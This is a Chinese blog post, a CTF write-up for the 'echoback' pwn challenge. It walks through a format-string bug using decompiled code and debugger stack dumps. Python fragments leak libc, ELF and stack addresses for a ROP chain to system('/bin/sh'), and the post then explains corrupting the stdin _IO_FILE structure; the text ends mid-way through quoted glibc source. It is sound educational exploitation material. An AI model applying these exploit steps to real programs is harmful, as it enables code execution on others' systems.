<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>wp echoback | I0gan</title><meta name="keywords" content="wp"><meta name="author" content="i0gan"><meta name="copyright" content="i0gan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="echoback题目来源: World of Attack &amp; Defense checksec    Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled vulunsigned __i">
<meta property="og:type" content="article">
<meta property="og:title" content="wp echoback">
<meta property="og:url" content="http://blog.i0gan.cn/2020/04/04/wp-echoback/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="echoback题目来源: World of Attack &amp; Defense checksec    Arch:     amd64-64-little     RELRO:    Full RELRO     Stack:    Canary found     NX:       NX enabled     PIE:      PIE enabled vulunsigned __i">
<meta property="og:locale">
<meta property="og:image" content="http://blog.i0gan.cn/img/text_bg.jpg">
<meta property="article:published_time" content="2020-04-04T05:00:44.000Z">
<meta property="article:modified_time" content="2020-09-15T10:05:04.000Z">
<meta property="article:author" content="i0gan">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blog.i0gan.cn/img/text_bg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.i0gan.cn/2020/04/04/wp-echoback/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-09-15 18:05:04'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">60</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/text_bg.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">I0gan</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">wp echoback</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-04-04T05:00:44.000Z" title="Created 2020-04-04 13:00:44">2020-04-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-09-15T10:05:04.000Z" title="Updated 2020-09-15 18:05:04">2020-09-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="echoback"><a href="#echoback" class="headerlink" title="echoback"></a>echoback</h1><p>题目来源: World of Attack &amp; Defense</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-bash"><code class="language-bash">    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_B80</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-14h] long int</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"length:"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>nbytes <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0LL</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>
    <span class="token function">LODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//limits</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s say:"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"anonymous say:"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbytes <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// fmt vum</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>明显的字符串漏洞,但是最多只允许输入7个字符.</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链</p>
<h3 id="泄漏libc基址"><a href="#泄漏libc基址" class="headerlink" title="泄漏libc基址"></a>泄漏libc基址</h3><p>传入 %p调试到vfprintf函数堆栈如下:</p>
<pre><code> 0x7ffe31470828 —▸ 0x7ffe3146e250 ◂— &#39;anonymous say:&#39;
 07:0038│      0x7ffe31470830 —▸ 0x7f81d9132780 (_IO_stdfile_1_lock) ◂— 0x0
 08:0040│      0x7ffe31470838 —▸ 0x7f81d8e632c0 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 09:0048│      0x7ffe31470840 —▸ 0x7f81d9339700 ◂— 0x7f81d9339700
 0a:0050│      0x7ffe31470848 ◂— 0xe
 0b:0058│      0x7ffe31470850 ◂— 0x6562b026
 0c:0060│      0x7ffe31470858 —▸ 0x7f81d91316a3 (_IO_2_1_stdout_+131) ◂— 0x132780000000000a 
 ...           ...
 28:0140│      0x7ffe31470938 ◂— 0x746df13682d53b00
 29:0148│      0x7ffe31470940 —▸ 0x562293252d30 ◂— push   r15
 2a:0150│      0x7ffe31470948 —▸ 0x7f81d8d8c830 (__libc_start_main+240) ◂— mov    edi, eax
 2b:0158│      0x7ffe31470950 —▸ 0x7ffe31470a28 —▸ 0x7ffe31470fb8
</code></pre>
<p>通过调试, 传入 %p打印时, 打印出0x7ffe31470830, 而 __libc_start_main+240 的地址在0x7ffe31470948, 调试不断加1进行核对地址,最终在 %19$p打印出libc_start_main + 240的地址.然后通过计算即可获取libc基址</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># leaking libc base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%19$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    libc_start_main <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">240</span>
    libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    sh_addr  <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h3 id="泄漏elf基址"><a href="#泄漏elf基址" class="headerlink" title="泄漏elf基址"></a>泄漏elf基址</h3><p>传入 %14$p查看printf函数中堆栈分布如下</p>
<pre><code>05:0028│ rdi  0x7ffc6b02ca80 ◂— 0xa7024343125 /* &#39;%14$p\n&#39; */
06:0030│      0x7ffc6b02ca88 ◂— 0xb8b63dff1d802400
07:0038│ rbp  0x7ffc6b02ca90 —▸ 0x7ffc6b02cac0 —▸ 0x55f4515b5d30 ◂— push   r15
08:0040│      0x7ffc6b02ca98 —▸ 0x55f4515b5d08 ◂— jmp    0x55f4515b5d0b
09:0048│      0x7ffc6b02caa0 —▸ 0x55f4515b5d30 ◂— push   r15
0a:0050│      0x7ffc6b02caa8 ◂— 0x200000000
0b:0058│      0x7ffc6b02cab0 ◂— 0x0
0c:0060│      0x7ffc6b02cab8 ◂— 0xb8b63dff1d802400</code></pre>
<p>打印出0x55f4515b5d30 ◂— push   r15, 而这个位置刚好在init函数的起始位置.在文件中偏移为: 0xD30 ( push    r15),这就可以计算elf的偏移了.然后获取main, pop rid的地址.</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># leaking elf base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%14$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    elf_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xD30</span>
    main_addr <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xC6C</span>
    pop_rdi_ret <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0xd93</span>
    li<span class="token punctuation">(</span><span class="token string">'elf_base:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h3 id="泄漏堆栈中main-ret地址"><a href="#泄漏堆栈中main-ret地址" class="headerlink" title="泄漏堆栈中main ret地址"></a>泄漏堆栈中main ret地址</h3><p>下图为printf函数中的堆栈</p>
<pre><code>pwndbg&gt; stack 100
00:0000│ rsp  0x7fffb8e184a8 —▸ 0x55ff36954c55 ◂— nop    
01:0008│      0x7fffb8e184b0 —▸ 0x55ff36954ef8 ◂— xor    ebp, dword ptr [rsi] /* &#39;3. exit&#39; */
02:0010│      0x7fffb8e184b8 —▸ 0x7fffb8e18500 ◂— 0x0
03:0018│      0x7fffb8e184c0 ◂— 0xa32 /* &#39;2\n&#39; */
04:0020│      0x7fffb8e184c8 ◂— 0x7134b9900
05:0028│ rdi  0x7fffb8e184d0 ◂— 0xa7024353125 /* &#39;%15$p\n&#39; */
06:0030│      0x7fffb8e184d8 ◂— 0xc7f0a378134b9900
07:0038│ rbp  0x7fffb8e184e0 —▸ 0x7fffb8e18510 #泄漏该地址, 获取main ret
08:0040│      0x7fffb8e184e8 —▸ 0x55ff36954d08 ◂— jmp    0x55ff36954d0b
09:0048│      0x7fffb8e184f0 —▸ 0x55ff36954d30 ◂— push   r15
0a:0050│      0x7fffb8e184f8 ◂— 0x200000000
0b:0058│      0x7fffb8e18500 ◂— 0x0
0c:0060│      0x7fffb8e18508 ◂— 0xc7f0a378134b9900
0d:0068│      0x7fffb8e18510 —▸ 0x55ff36954d30 ◂— push   r15 # main rbp
0e:0070│      0x7fffb8e18518 —▸ 0x7fa5b79af830 (__libc_start_main+240) #mian的返回地址</code></pre>
<p>以上0x7fffb8e18518就是我们要获取的main ret的堆栈地址, 在这里不能直接泄漏堆栈中的main ret地址,但可以通过泄漏 rbp地址来+8即可获取man ret.</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#leaking main ret in stack</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%12$p'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    main_ret <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x8</span></code></pre>
<h3 id="修改-IO-FILE将数据打入stack"><a href="#修改-IO-FILE将数据打入stack" class="headerlink" title="修改_IO_FILE将数据打入stack"></a>修改_IO_FILE将数据打入stack</h3><p>目前,准备工作基本完毕, 现在就是要靠修改main ret地址来劫持程序流, 但是我们想构造payload，往main_ret处写数据，但是光一个p64(main_ret)包装就占了8个字符，而我们最多允许输入7个字符，setName，它不是白放那里的，它有着重要的作用.</p>
<p>它也可以接受7个字符，我们可以把main_ret存入a1中，虽然只允许7个字符，p64()有8字节，但是末尾一般都是0，由于是低位存储，也就是数据的前导0被舍弃，没有影响，除非那个数据8字节没有前导0</p>
<p>然后，发现，%16$p输出的就是a1的数据,于是，可以先setName(p64(addr))，然后利用%16$n来对addr处写数据然而，我们这样来直接写main_ret处的数据，还是不行，因为我们构造的payload始终长度都会大于7,于是，就需要用到一个新知识了，为了绕过7个字符的限制，利用printf漏洞先去攻击scanf内部结构，然后就可以直接利用scanf往目标处输入数据，这就需要去了解scanf的源码.</p>
<h4 id="IO-FILE-struct"><a href="#IO-FILE-struct" class="headerlink" title="_IO_FILE struct"></a>_IO_FILE struct</h4><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
_IO_FILE *stdin = (FILE *) &amp;_IO_2_1_stdin_;    
_IO_FILE *stdout = (FILE *) &amp;_IO_2_1_stdout_;    
_IO_FILE *stderr = (FILE *) &amp;_IO_2_1_stderr_; 
*/</span>
<span class="token comment" spellcheck="true">/* The tag name of this struct is _IO_FILE to preserve historic 
   C++ mangled names for functions taking FILE* arguments. 
   That name should not be used in new code.  */</span>  
<span class="token keyword">struct</span> _IO_FILE  
<span class="token punctuation">{</span>  
  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">/* High-order word is _IO_MAGIC; rest is flags. */</span>  

  <span class="token comment" spellcheck="true">/* The following pointers correspond to the C++ streambuf protocol. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_ptr<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* Current read pointer */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_end<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* End of get area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_read_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Start of putback+get area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_base<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Start of put area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_ptr<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Current put pointer. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_write_end<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* End of put area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_base<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* Start of reserve area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_buf_end<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* End of reserve area. */</span>  

  <span class="token comment" spellcheck="true">/* The following fields are used to support backing up and undo. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to start of non-current get area. */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Pointer to first valid character of backup area */</span>  
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Pointer to end of non-current get area. */</span>  

  <span class="token keyword">struct</span> _IO_marker <span class="token operator">*</span>_markers<span class="token punctuation">;</span>  

  <span class="token keyword">struct</span> _IO_FILE <span class="token operator">*</span>_chain<span class="token punctuation">;</span>  

  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>  
  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>  
  __off_t _old_offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* This used to be _offset but it's too small.  */</span>  

  <span class="token comment" spellcheck="true">/* 1+column number of pbase(); 0 is unknown. */</span>  
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>  
  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>  
  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  

  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>  
<span class="token macro property">#<span class="token directive keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>  </code></pre>
<h4 id="IO-new-file-underflow"><a href="#IO-new-file-underflow" class="headerlink" title="_IO_new_file_underflow"></a>_IO_new_file_underflow</h4><p>看看文件的读取过程<strong>_IO_new_file_underflow</strong> <strong>这个函数最终调用了_IO_SYSREAD**</strong>系统调用来读取文件。在这之前，它做了一些处理**</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">_IO_new_file_underflow</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>  
<span class="token punctuation">{</span>  
  ssize_t count<span class="token punctuation">;</span>  

  <span class="token comment" spellcheck="true">/* C99 requires EOF to be "sticky".  */</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_EOF_SEEN<span class="token punctuation">)</span>  
    <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>  

  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      fp<span class="token operator">-></span>_flags <span class="token operator">|</span><span class="token operator">=</span> _IO_ERR_SEEN<span class="token punctuation">;</span>  
      <span class="token function">__set_errno</span> <span class="token punctuation">(</span>EBADF<span class="token punctuation">)</span><span class="token punctuation">;</span>  
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//判断是否已经读完</span>
    <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>  

  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token comment" spellcheck="true">/* Maybe we already have a push back pointer.  */</span>  
      <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  
    <span class="token punctuation">{</span>  
      <span class="token function">free</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_save_base<span class="token punctuation">)</span><span class="token punctuation">;</span>  
      fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token operator">~</span>_IO_IN_BACKUP<span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
